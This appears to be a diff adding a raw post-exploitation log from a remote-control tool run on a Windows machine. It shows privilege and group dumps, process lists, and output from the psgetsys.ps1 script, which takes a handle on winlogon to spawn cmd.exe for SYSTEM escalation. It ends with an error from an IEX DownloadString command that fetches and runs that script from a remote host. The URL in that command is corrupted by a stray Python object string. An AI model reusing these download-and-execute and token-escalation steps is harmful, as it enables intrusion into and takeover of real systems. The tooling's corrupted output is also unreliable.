@@ -1,0 +1,448 @@
+++++++++++++++++++
+	
+===============Current_user===============
+desktop-j0q0je0\alsadeq
+===============User_Privileges===============
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+===============User_group_information===============
+GROUP INFORMATION
+-----------------
+Group Name                                                    Type             SID          Attributes                                                     
+============================================================= ================ ============ ===============================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group             
+CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
+LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                
+	
+++++++++++++++++++  ++++++++++++++++++
+	
+	
+    Directory: C:\users\alsadeq\desktop
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         3/7/2023  11:27 AM           5649 psgetsys.ps1                                                          
+++++++++++++++++++ ++++++++++++++++++
+	
+===============Task_List===============
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        112 K
+smss.exe                       280 Services                   0        168 K
+csrss.exe                      372 Services                   0      2,524 K
+wininit.exe                    448 Services                   0      5,144 K
+csrss.exe                      456 Console                    1      3,980 K
+winlogon.exe                   516 Console                    1      4,336 K
+services.exe                   592 Services                   0      4,068 K
+lsass.exe                      600 Services                   0      8,936 K
+svchost.exe                    684 Services                   0     14,600 K
+fontdrvhost.exe                704 Services                   0        320 K
+fontdrvhost.exe                712 Console                    1      1,264 K
+svchost.exe                    808 Services                   0      8,848 K
+dwm.exe                        900 Console                    1     22,776 K
+svchost.exe                    948 Services                   0     49,972 K
+svchost.exe                   1000 Services                   0     16,196 K
+svchost.exe                    296 Services                   0     10,004 K
+svchost.exe                    876 Services                   0     15,920 K
+svchost.exe                   1060 Services                   0     23,088 K
+svchost.exe                   1220 Services                   0     14,660 K
+svchost.exe                   1268 Services                   0      6,912 K
+svchost.exe                   1396 Services                   0      2,780 K
+svchost.exe                   1404 Services                   0      3,752 K
+svchost.exe                   1444 Services                   0     18,568 K
+spoolsv.exe                   1540 Services                   0      6,704 K
+svchost.exe                   1904 Services                   0     12,884 K
+SecurityHealthService.exe     1948 Services                   0      8,592 K
+VGAuthService.exe             1988 Services                   0      4,328 K
+vm3dservice.exe               2004 Services                   0      2,980 K
+vmtoolsd.exe                  2020 Services                   0     11,784 K
+MsMpEng.exe                   2040 Services                   0    102,056 K
+Memory Compression            2068 Services                   0     52,564 K
+vm3dservice.exe               2128 Console                    1      3,288 K
+dllhost.exe                   2680 Services                   0      7,828 K
+WmiPrvSE.exe                  2756 Services                   0     13,520 K
+sihost.exe                    2780 Console                    1     16,432 K
+svchost.exe                   2848 Console                    1     20,796 K
+msdtc.exe                     2948 Services                   0      2,568 K
+explorer.exe                   344 Console                    1     41,836 K
+taskhostw.exe                 3096 Console                    1     10,112 K
+NisSrv.exe                    3344 Services                   0      4,844 K
+SearchUI.exe                  3984 Console                    1     15,400 K
+RuntimeBroker.exe             4144 Console                    1     33,976 K
+SettingSyncHost.exe           4336 Console                    1        968 K
+SearchIndexer.exe             5044 Services                   0     18,708 K
+MSASCuiL.exe                   936 Console                    1      4,012 K
+vmtoolsd.exe                  5620 Console                    1     12,596 K
+svchost.exe                   2956 Services                   0      6,456 K
+OneDrive.exe                  3772 Console                    1     13,468 K
+SkypeHost.exe                 3712 Console                    1         40 K
+WmiPrvSE.exe                  3524 Services                   0      7,916 K
+svchost.exe                   4440 Services                   0     11,104 K
+TrustedInstaller.exe          5768 Services                   0      7,184 K
+svchost.exe                   1436 Services                   0      4,868 K
+dllhost.exe                   2212 Console                    1     10,628 K
+cmd.exe                       2136 Console                    1      2,524 K
+conhost.exe                   2464 Console                    1     15,012 K
+ShellExperienceHost.exe       4372 Console                    1     39,132 K
+powershell.exe                1364 Console                    1     65,240 K
+MpCmdRun.exe                  5788 Services                   0      9,420 K
+taskhostw.exe                 2244 Console                    1     17,172 K
+SearchProtocolHost.exe        2088 Services                   0     11,592 K
+SearchFilterHost.exe          4700 Services                   0      6,296 K
+VSSVC.exe                     3568 Services                   0      7,940 K
+svchost.exe                    728 Services                   0      7,344 K
+wuauclt.exe                   3600 Services                   0     12,056 K
+powershell.exe                4684 Console                    1     53,928 K
+conhost.exe                   3768 Console                    1      7,404 K
+tasklist.exe                  5300 Console                    1      7,752 K
+TiWorker.exe                  4448 Services                   0    133,204 K
+++++++++++++++++++ ++++++++++++++++++
+	
+===============Task_List===============
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        112 K
+smss.exe                       280 Services                   0        168 K
+csrss.exe                      372 Services                   0      2,516 K
+wininit.exe                    448 Services                   0      5,144 K
+csrss.exe                      456 Console                    1      3,980 K
+winlogon.exe                   516 Console                    1      4,348 K
+services.exe                   592 Services                   0      4,076 K
+lsass.exe                      600 Services                   0      8,952 K
+svchost.exe                    684 Services                   0     14,648 K
+fontdrvhost.exe                704 Services                   0        336 K
+fontdrvhost.exe                712 Console                    1      1,272 K
+svchost.exe                    808 Services                   0      8,856 K
+dwm.exe                        900 Console                    1     22,784 K
+svchost.exe                    948 Services                   0     50,092 K
+svchost.exe                   1000 Services                   0     16,204 K
+svchost.exe                    296 Services                   0     10,000 K
+svchost.exe                    876 Services                   0     15,992 K
+svchost.exe                   1060 Services                   0     23,092 K
+svchost.exe                   1220 Services                   0     14,652 K
+svchost.exe                   1268 Services                   0      6,912 K
+svchost.exe                   1396 Services                   0      2,780 K
+svchost.exe                   1404 Services                   0      3,752 K
+svchost.exe                   1444 Services                   0     18,436 K
+spoolsv.exe                   1540 Services                   0      6,812 K
+svchost.exe                   1904 Services                   0     12,608 K
+SecurityHealthService.exe     1948 Services                   0      8,592 K
+VGAuthService.exe             1988 Services                   0      4,344 K
+vm3dservice.exe               2004 Services                   0      2,996 K
+vmtoolsd.exe                  2020 Services                   0     11,784 K
+MsMpEng.exe                   2040 Services                   0    100,636 K
+Memory Compression            2068 Services                   0     49,404 K
+vm3dservice.exe               2128 Console                    1      3,304 K
+dllhost.exe                   2680 Services                   0      7,832 K
+WmiPrvSE.exe                  2756 Services                   0     13,588 K
+sihost.exe                    2780 Console                    1     16,444 K
+svchost.exe                   2848 Console                    1     20,796 K
+msdtc.exe                     2948 Services                   0      2,584 K
+explorer.exe                   344 Console                    1     41,796 K
+taskhostw.exe                 3096 Console                    1     10,004 K
+NisSrv.exe                    3344 Services                   0      4,844 K
+SearchUI.exe                  3984 Console                    1     15,412 K
+RuntimeBroker.exe             4144 Console                    1     32,780 K
+SettingSyncHost.exe           4336 Console                    1        940 K
+SearchIndexer.exe             5044 Services                   0     19,004 K
+MSASCuiL.exe                   936 Console                    1      4,028 K
+vmtoolsd.exe                  5620 Console                    1     12,604 K
+svchost.exe                   2956 Services                   0      6,460 K
+OneDrive.exe                  3772 Console                    1     13,472 K
+SkypeHost.exe                 3712 Console                    1         56 K
+WmiPrvSE.exe                  3524 Services                   0      7,916 K
+svchost.exe                   4440 Services                   0     11,140 K
+TrustedInstaller.exe          5768 Services                   0      7,184 K
+svchost.exe                   1436 Services                   0      5,232 K
+dllhost.exe                   2212 Console                    1     10,628 K
+cmd.exe                       2136 Console                    1      2,532 K
+conhost.exe                   2464 Console                    1     15,020 K
+ShellExperienceHost.exe       4372 Console                    1     39,148 K
+powershell.exe                1364 Console                    1     65,616 K
+MpCmdRun.exe                  5788 Services                   0      9,420 K
+taskhostw.exe                 2244 Console                    1     15,348 K
+VSSVC.exe                     3568 Services                   0      7,908 K
+svchost.exe                    728 Services                   0      7,328 K
+TiWorker.exe                  4448 Services                   0     35,336 K
+wuauclt.exe                   3600 Services                   0     12,028 K
+powershell.exe                3380 Console                    1     53,924 K
+conhost.exe                   5916 Console                    1      7,400 K
+tasklist.exe                  1316 Console                    1      7,756 K
+	
+++++++++++++++++++ ++++++++++++++++++
+	
+===============Task_List===============
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        112 K
+smss.exe                       280 Services                   0        168 K
+csrss.exe                      372 Services                   0      2,532 K
+wininit.exe                    448 Services                   0      5,144 K
+csrss.exe                      456 Console                    1      3,980 K
+winlogon.exe                   516 Console                    1      4,420 K
+services.exe                   592 Services                   0      4,076 K
+lsass.exe                      600 Services                   0      8,980 K
+svchost.exe                    684 Services                   0     14,712 K
+fontdrvhost.exe                704 Services                   0        336 K
+fontdrvhost.exe                712 Console                    1      1,272 K
+svchost.exe                    808 Services                   0      8,864 K
+dwm.exe                        900 Console                    1     22,948 K
+svchost.exe                    948 Services                   0     50,096 K
+svchost.exe                   1000 Services                   0     16,100 K
+svchost.exe                    296 Services                   0     10,260 K
+svchost.exe                    876 Services                   0     16,232 K
+svchost.exe                   1060 Services                   0     23,212 K
+svchost.exe                   1220 Services                   0     14,680 K
+svchost.exe                   1396 Services                   0      2,788 K
+svchost.exe                   1404 Services                   0      3,756 K
+svchost.exe                   1444 Services                   0     18,628 K
+spoolsv.exe                   1540 Services                   0      6,812 K
+svchost.exe                   1268 Services                   0      6,912 K
+svchost.exe                   1904 Services                   0     15,440 K
+SecurityHealthService.exe     1948 Services                   0      9,440 K
+VGAuthService.exe             1988 Services                   0      4,344 K
+vm3dservice.exe               2004 Services                   0      2,996 K
+vmtoolsd.exe                  2020 Services                   0     11,784 K
+MsMpEng.exe                   2040 Services                   0    102,288 K
+Memory Compression            2068 Services                   0     48,788 K
+vm3dservice.exe               2128 Console                    1      3,304 K
+dllhost.exe                   2680 Services                   0      7,832 K
+WmiPrvSE.exe                  2756 Services                   0     13,648 K
+sihost.exe                    2780 Console                    1     16,456 K
+svchost.exe                   2848 Console                    1     21,008 K
+msdtc.exe                     2948 Services                   0      2,584 K
+explorer.exe                   344 Console                    1     42,352 K
+taskhostw.exe                 3096 Console                    1     10,012 K
+NisSrv.exe                    3344 Services                   0      4,844 K
+SearchUI.exe                  3984 Console                    1     15,412 K
+RuntimeBroker.exe             4144 Console                    1     32,292 K
+SettingSyncHost.exe           4336 Console                    1        940 K
+SearchIndexer.exe             5044 Services                   0     19,296 K
+MSASCuiL.exe                   936 Console                    1      4,028 K
+vmtoolsd.exe                  5620 Console                    1     13,420 K
+svchost.exe                   2956 Services                   0      6,460 K
+OneDrive.exe                  3772 Console                    1     13,532 K
+SkypeHost.exe                 3712 Console                    1         56 K
+WmiPrvSE.exe                  3524 Services                   0      8,076 K
+svchost.exe                   4440 Services                   0     11,140 K
+TrustedInstaller.exe          5768 Services                   0      7,184 K
+svchost.exe                   1436 Services                   0      5,232 K
+dllhost.exe                   2212 Console                    1     10,628 K
+cmd.exe                       2136 Console                    1      2,532 K
+conhost.exe                   2464 Console                    1     15,044 K
+ShellExperienceHost.exe       4372 Console                    1     39,148 K
+powershell.exe                1364 Console                    1     65,748 K
+MpCmdRun.exe                  5788 Services                   0      9,420 K
+taskhostw.exe                 2244 Console                    1     14,740 K
+svchost.exe                    728 Services                   0      7,332 K
+TiWorker.exe                  4448 Services                   0     52,944 K
+wuauclt.exe                   3600 Services                   0     12,028 K
+SearchProtocolHost.exe        5168 Services                   0     11,696 K
+SearchFilterHost.exe          3440 Services                   0      6,324 K
+powershell.exe                5940 Console                    1     54,088 K
+conhost.exe                   5600 Console                    1      7,400 K
+tasklist.exe                  4224 Console                    1      7,748 K
+	
+++++++++++++++++++ [+] Got Handle for ppid: 516
+[+] Updated proc attribute list
+[+] Starting c:\windows\system32\cmd.exe...True - pid: 1672 - Last error: 87 ++++++++++++++++++
+	
+===============Task_List===============
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+smss.exe                       280 Services                   0        168 K
+System                           4 Services                   0        124 K
+csrss.exe                      372 Services                   0      2,656 K
+wininit.exe                    448 Services                   0      4,820 K
+csrss.exe                      456 Console                    1      4,016 K
+winlogon.exe                   516 Console                    1      5,100 K
+services.exe                   592 Services                   0      4,976 K
+lsass.exe                      600 Services                   0     24,064 K
+svchost.exe                    684 Services                   0     38,508 K
+fontdrvhost.exe                704 Services                   0      1,424 K
+fontdrvhost.exe                712 Console                    1      1,612 K
+svchost.exe                    808 Services                   0     21,036 K
+dwm.exe                        900 Console                    1     67,628 K
+svchost.exe                    948 Services                   0    110,984 K
+svchost.exe                   1000 Services                   0     30,128 K
+svchost.exe                    296 Services                   0     46,556 K
+svchost.exe                    876 Services                   0     39,136 K
+svchost.exe                   1060 Services                   0     56,516 K
+svchost.exe                   1220 Services                   0     37,180 K
+svchost.exe                   1268 Services                   0     23,156 K
+svchost.exe                   1396 Services                   0     12,640 K
+svchost.exe                   1404 Services                   0     14,448 K
+svchost.exe                   1444 Services                   0     42,448 K
+spoolsv.exe                   1540 Services                   0      7,212 K
+svchost.exe                   1904 Services                   0     35,008 K
+SecurityHealthService.exe     1948 Services                   0      9,432 K
+VGAuthService.exe             1988 Services                   0      4,388 K
+vm3dservice.exe               2004 Services                   0      3,340 K
+vmtoolsd.exe                  2020 Services                   0     11,956 K
+MsMpEng.exe                   2040 Services                   0    123,604 K
+Memory Compression            2068 Services                   0    104,236 K
+vm3dservice.exe               2128 Console                    1      3,768 K
+dllhost.exe                   2680 Services                   0     21,564 K
+WmiPrvSE.exe                  2756 Services                   0     13,840 K
+sihost.exe                    2780 Console                    1     16,812 K
+svchost.exe                   2848 Console                    1     70,760 K
+msdtc.exe                     2948 Services                   0      2,640 K
+explorer.exe                   344 Console                    1    141,560 K
+taskhostw.exe                 3096 Console                    1      8,872 K
+NisSrv.exe                    3344 Services                   0      5,224 K
+SearchUI.exe                  3984 Console                    1     46,300 K
+RuntimeBroker.exe             4144 Console                    1     31,804 K
+SettingSyncHost.exe           4336 Console                    1      1,604 K
+SearchIndexer.exe             5044 Services                   0     17,952 K
+MSASCuiL.exe                   936 Console                    1      4,476 K
+vmtoolsd.exe                  5620 Console                    1     14,032 K
+svchost.exe                   2956 Services                   0     15,624 K
+OneDrive.exe                  3772 Console                    1     15,132 K
+SkypeHost.exe                 3712 Console                    1        156 K
+WmiPrvSE.exe                  3524 Services                   0      8,136 K
+svchost.exe                   1436 Services                   0     13,288 K
+dllhost.exe                   2212 Console                    1     25,200 K
+cmd.exe                       2136 Console                    1      2,336 K
+conhost.exe                   2464 Console                    1     21,552 K
+ShellExperienceHost.exe       4372 Console                    1     40,856 K
+powershell.exe                1364 Console                    1    155,940 K
+taskhostw.exe                 2244 Console                    1     15,776 K
+cmd.exe                       1672 Console                    1      2,860 K
+conhost.exe                   2268 Console                    1     11,364 K
+msiexec.exe                   4092 Services                   0     45,488 K
+powershell.exe                4380 Console                    1    187,240 K
+sedsvc.exe                    3652 Services                   0     14,080 K
+sedlauncher.exe               1360 Services                   0      9,376 K
+conhost.exe                   2252 Services                   0      1,144 K
+wuauclt.exe                    380 Services                   0     20,124 K
+Windows-KB890830-x64-V5.1     4000 Services                   0     44,264 K
+svchost.exe                   4440 Services                   0     16,164 K
+WMIADAP.exe                   4240 Services                   0      7,164 K
+MRT.exe                        628 Services                   0    124,744 K
+MpCmdRun.exe                  1800 Services                   0     10,888 K
+svchost.exe                    888 Services                   0     10,152 K
+TrustedInstaller.exe          3776 Services                   0      6,584 K
+TiWorker.exe                  4352 Services                   0      8,272 K
+powershell.exe                3444 Console                    1     53,880 K
+conhost.exe                   4644 Console                    1      7,400 K
+tasklist.exe                  2508 Console                    1      7,724 K
+++++++++++++++++++ ++++++++++++++++++
+	
+===============Task_List===============
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        124 K
+smss.exe                       280 Services                   0        268 K
+csrss.exe                      372 Services                   0      2,708 K
+wininit.exe                    448 Services                   0      4,836 K
+csrss.exe                      456 Console                    1      4,240 K
+winlogon.exe                   516 Console                    1      9,732 K
+services.exe                   592 Services                   0      5,148 K
+lsass.exe                      600 Services                   0     24,676 K
+svchost.exe                    684 Services                   0     39,860 K
+fontdrvhost.exe                704 Services                   0      1,496 K
+fontdrvhost.exe                712 Console                    1      1,820 K
+svchost.exe                    808 Services                   0     21,432 K
+dwm.exe                        900 Console                    1     64,596 K
+svchost.exe                    948 Services                   0     73,984 K
+svchost.exe                   1000 Services                   0     34,052 K
+svchost.exe                    296 Services                   0     44,516 K
+svchost.exe                    876 Services                   0     45,320 K
+svchost.exe                   1060 Services                   0     48,560 K
+svchost.exe                   1220 Services                   0     33,260 K
+svchost.exe                   1268 Services                   0     23,712 K
+svchost.exe                   1396 Services                   0     12,800 K
+svchost.exe                   1404 Services                   0     14,772 K
+svchost.exe                   1444 Services                   0     31,684 K
+spoolsv.exe                   1540 Services                   0      7,928 K
+svchost.exe                   1904 Services                   0     37,024 K
+SecurityHealthService.exe     1948 Services                   0     11,056 K
+VGAuthService.exe             1988 Services                   0      4,404 K
+vm3dservice.exe               2004 Services                   0      3,488 K
+vmtoolsd.exe                  2020 Services                   0     12,800 K
+MsMpEng.exe                   2040 Services                   0    138,504 K
+Memory Compression            2068 Services                   0     85,764 K
+vm3dservice.exe               2128 Console                    1      3,832 K
+dllhost.exe                   2680 Services                   0     21,612 K
+WmiPrvSE.exe                  2756 Services                   0     16,368 K
+sihost.exe                    2780 Console                    1     17,336 K
+svchost.exe                   2848 Console                    1     46,804 K
+msdtc.exe                     2948 Services                   0      2,980 K
+explorer.exe                   344 Console                    1     98,140 K
+taskhostw.exe                 3096 Console                    1     13,016 K
+NisSrv.exe                    3344 Services                   0      1,452 K
+SearchUI.exe                  3984 Console                    1     48,484 K
+RuntimeBroker.exe             4144 Console                    1     37,644 K
+SettingSyncHost.exe           4336 Console                    1      4,332 K
+SearchIndexer.exe             5044 Services                   0     21,928 K
+MSASCuiL.exe                   936 Console                    1      4,820 K
+vmtoolsd.exe                  5620 Console                    1     20,452 K
+svchost.exe                   2956 Services                   0     19,000 K
+SkypeHost.exe                 3712 Console                    1        352 K
+svchost.exe                   1436 Services                   0     13,292 K
+dllhost.exe                   2212 Console                    1     26,492 K
+ShellExperienceHost.exe       4372 Console                    1     37,228 K
+taskhostw.exe                 2244 Console                    1     15,672 K
+sedsvc.exe                    3652 Services                   0     12,804 K
+OneDrive.exe                  6480 Console                    1      9,372 K
+svchost.exe                   1564 Services                   0      8,348 K
+audiodg.exe                   3960 Services                   0     11,472 K
+backgroundTaskHost.exe        3888 Console                    1     18,156 K
+cmd.exe                       6068 Console                    1      3,144 K
+conhost.exe                   4260 Console                    1     20,052 K
+powershell.exe                5452 Console                    1     73,760 K
+powershell.exe                5796 Console                    1     53,980 K
+conhost.exe                   1588 Console                    1      7,428 K
+tasklist.exe                  3752 Console                    1      7,796 K
+++++++++++++++++++  Exception calling "DownloadString" with "1" argument(s): "Illegal characters in path."
+At line:1 char:1
++ IEX (New-Object Net.WebClient).DownloadString('http://<django.db.mode ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : ArgumentException
+ 
+Unable to find type [MyProcess].
+At line:1 char:149
++ ... ute object at 0x7f15ffe2b220>:8888/psgetsys.ps1');[MyProcess]::Create ...
++                                                       ~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (MyProcess:TypeName) [], RuntimeException
+    + FullyQualifiedErrorId : TypeNotFound
